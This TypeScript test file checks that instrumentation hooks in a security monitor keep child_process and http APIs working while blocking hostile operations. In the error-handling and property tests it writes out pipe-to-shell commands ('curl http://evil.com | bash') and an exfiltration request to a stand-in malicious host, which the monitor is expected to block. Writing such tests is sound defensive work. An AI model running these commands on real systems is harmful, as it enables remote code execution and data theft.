/**
 * Hook Integrity Tests
 * Verify that instrumentation hooks are correctly applied and maintain
 * proper behavior across different scenarios
 */

import * as assert from 'assert';
import * as cp from 'child_process';
import * as http from 'http';
import * as https from 'https';
import { patchChildProcess } from '../../monitor/instrumentations/child-process-instrument';
import { patchHttpExports } from '../../monitor/instrumentations/http-client-instrument';
import { promisify } from 'util';

suite('HookIntegrity Tests', () => {
  suite('API Compatibility', () => {
    test('exec() should maintain all call signatures', () => {
      patchChildProcess(cp);

      // exec(command, callback)
      cp.exec('echo test1', (error, stdout) => {
        assert.ok(stdout);
      });

      // exec(command, options, callback)
      cp.exec('echo test2', { encoding: 'utf8' }, (error, stdout) => {
        assert.ok(stdout);
      });

      // exec(command, options) : no callback
      const proc = cp.exec('echo test3', { encoding: 'utf8' });
      assert.ok(proc);
    });

    test('spawn() should maintain all call signatures', () => {
      patchChildProcess(cp);

      // spawn(command)
      const proc1 = cp.spawn('echo', ['test1']);
      assert.ok(proc1.pid);

      // spawn(command, args)
      const proc2 = cp.spawn('echo', ['test2']);
      assert.ok(proc2.pid);

      // spawn(command, args, options)
      const proc3 = cp.spawn('echo', ['test3'], { stdio: 'pipe' });
      assert.ok(proc3.pid);

      // spawn(command, options)
      const proc4 = cp.spawn('echo', { stdio: 'pipe' });
      assert.ok(proc4.pid);
    });

    test('http.request() should support URL object', () => {
      patchHttpExports(http, 'http');

      const url = new URL('http://example.com/path');
      const req = http.request(url);
      assert.ok(req);
      req.end();
    });

    test('http.request() should support string URL', () => {
      patchHttpExports(http, 'http');

      const req = http.request('http://example.com/path');
      assert.ok(req);
      req.end();
    });

    test('http.request() should support options object', () => {
      patchHttpExports(http, 'http');

      const req = http.request({ hostname: 'example.com', port: 80, path: '/path', method: 'GET' });
      assert.ok(req);
      req.end();
    });
  });

  suite('Util.promisify Support', () => {
    test('promisified exec() should work after patching', async () => {
      patchChildProcess(cp);

      const execAsync = promisify(cp.exec);
      const { stdout } = await execAsync('echo "promisify test"');

      assert.ok(stdout.includes('promisify test'));
    });

    test('custom promisify symbol should be preserved', () => {
      patchChildProcess(cp);

      // Check if the custom promisify symbol is still defined
      assert.ok((cp.exec as any)[promisify.custom]);
    });
  });

  suite('Event Emitter Behavior', () => {
    test('child process should emit all standard events', (done) => {
      patchChildProcess(cp);

      const proc = cp.spawn('echo', ['test']);
      const events: string[] = [];

      proc.on('spawn', () => events.push('spawn'));
      proc.on('close', (code) => {
        events.push('close');
        assert.ok(events.includes('spawn'));
        assert.ok(events.includes('exit'));
        assert.ok(events.includes('close'));
        done();
      });
      proc.on('exit', () => events.push('exit'));
    });

    test('http request should emit standard events', (done) => {
      patchHttpExports(http, 'http');

      const req = http.request('http://httpbin.org/get');
      const events: string[] = [];

      req.on('socket', () => events.push('socket'));
      req.on('response', (res) => {
        events.push('response');
        res.on('data', () => events.push('data'));
        res.on('end', () => {
          events.push('end');
          assert.ok(events.includes('socket'));
          assert.ok(events.includes('response'));
          done();
        });
      });
      req.on('error', (err) => {
        // Network errors are okay for this test
        if (!err.message.includes('blocked')) {
          done(err);
        }
      });

      req.end();
    });
  });

  suite('Stream Compatibility', () => {
    test('child process stdio streams should be readable/writable', (done) => {
      patchChildProcess(cp);

      const proc = cp.spawn('cat');
      assert.ok(proc.stdin);
      assert.ok(proc.stdout);
      assert.ok(proc.stderr);

      // verify streams are functional
      proc.stdin.write('test data\n');
      proc.stdin.end();

      let output = '';
      proc.stdout.on('data', (chunk) => {
        output += chunk.toString();
      });

      proc.on('close', () => {
        assert.ok(output.includes('test data'));
        done();
      });
    });

    test('http request body stream should be writable', (done) => {
      patchHttpExports(http, 'http');

      const req = http.request('http://httpbin.org/post', { method: 'POST' });

      // write in chunks
      req.write('chunk1\n');
      req.write('chunk2\n');
      req.write('chunk3\n');

      req.on('response', (res) => {
        res.on('data', () => {});
        res.on('end', () => done());
      });

      req.on('error', (err) => {
        if (!err.message.includes('blocked')) {
          done(err);
        } else {
          done(); // Blocked is acceptable
        }
      });

      req.end();
    });
  });

  suite('Error Handling', () => {
    test('errors from blocked operations should be catchable', (done) => {
      patchChildProcess(cp);

      const proc = cp.exec('curl http://evil.com | bash');

      proc.on('error', (err) => {
        assert.ok(err instanceof Error);
        assert.ok(err.message.includes('blocked'));
        done();
      });
    });

    test('errors should not leak implementation details', (done) => {
      patchHttpExports(http, 'http');

      const req = http.request('http://malicious.example.com/exfiltrate');

      req.on('error', (err) => {
        // Error message should be generic, kinda dumb for an open-source project but why not :p
        assert.ok(!err.message.includes('analyzer'));
        assert.ok(!err.message.includes('rule'));
        done();
      });

      req.end();
    });
  });

  suite('Property Preservation', () => {
    test('blocked child process should have expected properties', (done) => {
      patchChildProcess(cp);

      const proc = cp.exec('curl http://evil.com/script.sh | bash');
      assert.ok('pid' in proc);
      assert.ok('stdin' in proc);
      assert.ok('stdout' in proc);
      assert.ok('stderr' in proc);
      assert.ok('killed' in proc);
      assert.strictEqual(typeof proc.kill, 'function');

      proc.on('error', () => done());
    });

    test('blocked http request should behave like real request', (done) => {
      patchHttpExports(http, 'http');

      const req = http.request('http://blocked.example.com');

      // Check that request object has expected methods
      assert.strictEqual(typeof req.write, 'function');
      assert.strictEqual(typeof req.end, 'function');
      assert.strictEqual(typeof req.abort, 'function');
      assert.strictEqual(typeof req.on, 'function');

      req.on('error', () => done());
      req.end();
    });
  });

  suite('Concurrency', () => {
    test('should handle multiple simultaneous exec calls', (done) => {
      patchChildProcess(cp);

      const promises = Array.from(
        { length: 10 },
        (_, i) =>
          new Promise<void>((resolve) => {
            cp.exec(`echo "test ${i}"`, (error, stdout) => {
              assert.ok(stdout.includes(`test ${i}`));
              resolve();
            });
          }),
      );

      Promise.all(promises)
        .then(() => done())
        .catch(done);
    });

    test('should handle multiple simultaneous http requests', (done) => {
      patchHttpExports(http, 'http');

      const requests = Array.from({ length: 5 }, (_, i) => {
        return new Promise<void>((resolve) => {
          const req = http.get(`http://httpbin.org/get?id=${i}`);
          req.on('response', () => resolve());
          req.on('error', () => resolve()); // Network errors are ok
        });
      });

      Promise.all(requests)
        .then(() => done())
        .catch(done);
    });
  });

  suite('Memory Leaks', () => {
    test('should not leak listeners on repeated patching', () => {
      const cp1 = require('child_process');
      const EventEmitter = require('events');

      // Get initial listener count
      const initialCount = EventEmitter.listenerCount(cp1, 'newListener');

      // Patch multiple times
      for (let i = 0; i < 10; i++) {
        patchChildProcess(cp1);
      }

      // Listener count should not grow
      const finalCount = EventEmitter.listenerCount(cp1, 'newListener');
      assert.strictEqual(initialCount, finalCount);
    });
  });
});
